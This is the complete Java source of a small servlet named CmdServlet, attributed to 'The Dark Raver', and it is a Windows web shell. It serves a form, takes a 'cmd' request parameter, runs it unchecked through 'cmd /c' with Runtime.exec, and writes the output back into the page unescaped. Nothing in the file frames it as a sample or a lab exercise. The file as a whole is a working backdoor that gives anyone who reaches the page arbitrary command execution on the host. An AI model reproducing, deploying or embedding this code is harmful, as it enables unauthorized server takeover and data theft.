/*
 * CmdServlet.java	20/01/2004
 *
 * @author The Dark Raver
 * @version 0.1
 */

import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;


public class CmdServlet extends HttpServlet {

    public void doGet(HttpServletRequest req, HttpServletResponse res)	throws ServletException, IOException {
		res.setContentType("text/html");

		PrintWriter out = res.getWriter();
		out.print("<html><body>");
		out.print("<hr><p><form method=\"GET\" name=\"myform\" action=\"\">");
		out.print("<input type=\"text\" name=\"cmd\">");
		out.print("<input type=\"submit\" value=\"Send\">");
		out.print("</form>");

		if(req.getParameter("cmd") != null) {
	        out.print("\n<hr><p><b>Command: " + req.getParameter("cmd") + "\n</b><br><br><hr><pre>\n");
	        Process p = Runtime.getRuntime().exec("cmd /c " + req.getParameter("cmd"));
	        DataInputStream procIn = new DataInputStream(p.getInputStream());
			int c='\0';
        	while ((c=procIn.read()) != -1) {
				out.print((char)c);
				}
	        }

		out.print("\n<hr></pre>");
		out.print("</body></html>");
    }

    public String getServletInfo() {
		return "CmdServlet 0.1";
    }

}
